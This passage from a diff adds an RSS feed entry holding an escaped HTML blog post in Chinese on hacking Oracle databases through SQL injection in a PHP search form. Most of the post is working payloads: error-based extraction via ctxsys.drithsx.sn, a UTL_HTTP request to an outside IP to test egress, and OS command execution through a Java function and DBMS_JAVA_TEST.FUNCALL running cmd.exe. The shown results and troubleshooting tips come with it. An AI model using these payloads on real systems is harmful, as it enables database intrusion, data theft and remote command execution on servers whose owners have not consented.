+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;td&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'AGE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;/td&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/tr&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;/table&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;oci_free_statement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;oci_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;length=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;15&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Search&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;搜索框注入 搜索a 可以看到相关sql语句 
+ &lt;img src=&quot;/images/posts/hackingoracle/WX20180619-171718@2x.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--
+ 查当前用户 TEST
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/hackingoracle/2.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;' and 1 = ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'))--
+ 查看版本 Oracle Database 10g Enterprise Edition Release 10.2.0.3.0 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/hackingoracle/3.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;' and UTL_HTTP.REQUEST('http://74.121.151.89:53')='1'--判断能否出网 能出网
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ' and 1 = ctxsys.drithsx.sn(1,(select wmsys.wm_concat(granted_role) from user_role_privs))--
+查当前用户权限 CONNECT,RESOURCE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/hackingoracle/4.png&quot; alt=&quot;image&quot; /&gt; 
+提权到dba皆失败&lt;br /&gt;
+11.1.0.7.0以下可以用dbms_xmlquery.newcontext来执行pl/sql来执行命令(命令在上面)
+  &lt;img src=&quot;/images/posts/hackingoracle/5.png&quot; alt=&quot;image&quot; /&gt; 
+依次执行上面sql语句后 可以在navicat中查看
+执行select * from user_objects可以查看相关函数是否创建成功
+&lt;img src=&quot;/images/posts/hackingoracle/6.png&quot; alt=&quot;image&quot; /&gt; 
+执行select * from user_java_policy 查看其相应的权限是否加上
+&lt;img src=&quot;/images/posts/hackingoracle/7.png&quot; alt=&quot;image&quot; /&gt; 
+在web中 可以使用下面的语句来判断是否加上&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;' and 1 = ctxsys.drithsx.sn(1,(select count(*) from user_java_policy where grantee_name='TEST'))--
+' and 1 = ctxsys.drithsx.sn(1,(select * from user_objects where OBJECT_NAME='javaexec'))--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;最后执行命令 whoami会报错(具体原因不详) 但程序还是会执行 想要实时查看可以换个命令 以下分别是四个截图的效果&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'||utl_inaddr.get_host_name((select javacmd('whoami') from dual))||'
+'||utl_inaddr.get_host_name((select javacmd('ping 8.8.8.8') from dual))||'
+'||utl_inaddr.get_host_name((Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','ping 74.121.151.89') from dual))||'   #注意这个不能回显
+'||utl_inaddr.get_host_name((select utl_raw.cast_to_varchar2(utl_encode.base64_encode(utl_raw.cast_to_raw(javacmd('ipconfig')))) from dual))||' #有的时候使用base64加密后看着稍微舒服一点
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;whoami
+&lt;img src=&quot;/images/posts/hackingoracle/8.png&quot; alt=&quot;image&quot; /&gt; 
+ping 8.8.8.8
+&lt;img src=&quot;/images/posts/hackingoracle/9.png&quot; alt=&quot;image&quot; /&gt; 
+DBMS_JAVA_TEST.FUNCAL
+&lt;img src=&quot;/images/posts/hackingoracle/10.png&quot; alt=&quot;image&quot; /&gt; 
+base64 encode
+&lt;img src=&quot;/images/posts/hackingoracle/12.png&quot; alt=&quot;image&quot; /&gt; 
+一些需要注意的坑：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;有的语句直接放到navicat里面是可以执行的，但是通过web执行会出问题，所有建议本地测试后再转码运行，一般情况下oracle中双引号会包含特定字符，所以一般会看到一些’’'’成对的双引号，转码时’’'’变成’’ ‘‘变成’ ‘直接去除就可以了。 &lt;br /&gt;
+其他参考链接如下：
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/
+https://www.t00ls.net/articles-23608.html
+https://github.com/alexei-led/docker-oracle-xe-11g
+https://www.secpulse.com/archives/30872.html
+http://psoug.org/articles/Hacking-Aurora-in-Oracle-11g.htm
+http://www.red-database-security.com/tutorial/run_os_commands_via_webapp.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;#
+转载请注明：&lt;a href=&quot;https://notwhy.github.io/&quot;&gt;whynot&lt;/a&gt; » &lt;a href=&quot;https://notwhy.gitbooks.io//2018/06/hacking-oracle/&quot;&gt;hacking_ora&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Tue, 19 Jun 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/06/hacking-oracle/</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/06/hacking-oracle/</guid>
+        
+        <category>sql-injection</category>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
